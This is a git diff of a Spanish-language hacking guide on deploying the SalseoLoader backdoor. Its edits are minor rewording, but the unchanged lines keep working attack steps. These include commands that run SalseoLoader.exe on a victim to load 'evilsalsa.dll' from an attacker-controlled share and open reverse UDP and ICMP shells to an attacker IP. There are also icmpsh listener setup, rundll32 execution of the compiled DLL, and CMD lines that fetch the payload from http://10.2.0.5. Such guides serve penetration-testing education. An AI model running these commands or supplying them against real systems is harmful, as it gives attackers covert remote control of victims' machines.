@@ -86,7 +86,7 @@ SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <A
 
 **Esta vez necesitarás una herramienta especial en el cliente para recibir la shell inversa. Descarga:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)
 
-#### **Desactivar Respuestas ICMP:**
+#### **Desactivar respuestas ICMP:**
 ```
 sysctl -w net.ipv4.icmp_echo_ignore_all=1
 
@@ -97,11 +97,11 @@ sysctl -w net.ipv4.icmp_echo_ignore_all=0
 ```
 python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
 ```
-#### Dentro de la víctima, ejecutemos la técnica salseo:
+#### Dentro de la víctima, ejecutemos la cosa salseo:
 ```
 SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
 ```
-## Compilando SalseoLoader como DLL exportando la función principal
+## Compilando SalseoLoader como DLL exportando función principal
 
 Abre el proyecto SalseoLoader usando Visual Studio.
 
@@ -111,9 +111,9 @@ Abre el proyecto SalseoLoader usando Visual Studio.
 
 ### Instala DllExport para este proyecto
 
-#### **Herramientas** --> **Administrador de paquetes NuGet** --> **Administrar paquetes NuGet para la solución...**
+#### **Herramientas** --> **Gestor de paquetes NuGet** --> **Administrar paquetes NuGet para la solución...**
 
-![](<../.gitbook/assets/image (3) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (3) (1) (1) (1) (1).png>)
 
 #### **Busca el paquete DllExport (usando la pestaña Examinar) y presiona Instalar (y acepta el mensaje emergente)**
 
@@ -137,7 +137,7 @@ Selecciona **x64** (si lo vas a usar dentro de una caja x64, ese fue mi caso), s
 
 ![](<../.gitbook/assets/image (7) (1) (1) (1).png>)
 
-### **Abre el proyecto de nuevo con Visual Studio**
+### **Abre el proyecto nuevamente con Visual Studio**
 
 **\[DllExport]** ya no debería estar marcado como error
 
@@ -180,7 +180,7 @@ rundll32.exe SalseoLoader.dll,main
 ```
 ### CMD
 
-CMD (Command Prompt) es una herramienta de línea de comandos en sistemas operativos Windows que permite a los usuarios interactuar con el sistema operativo mediante comandos. Los comandos CMD pueden ser utilizados para realizar diversas tareas, como la gestión de archivos y directorios, la configuración de redes y la ejecución de programas. Los hackers pueden utilizar CMD para ejecutar comandos maliciosos y crear backdoors en sistemas Windows comprometidos.
+CMD (Command Prompt) es una herramienta de línea de comandos en sistemas operativos Windows que permite a los usuarios interactuar con el sistema operativo mediante comandos. Los comandos CMD pueden ser utilizados para realizar diversas tareas, como la gestión de archivos y directorios, la configuración de redes, la ejecución de programas y la solución de problemas de sistema. Los hackers pueden utilizar CMD para ejecutar comandos maliciosos y crear backdoors en sistemas comprometidos.
 ```
 set pass=password
 set payload=http://10.2.0.5/evilsalsax64.dll.txt
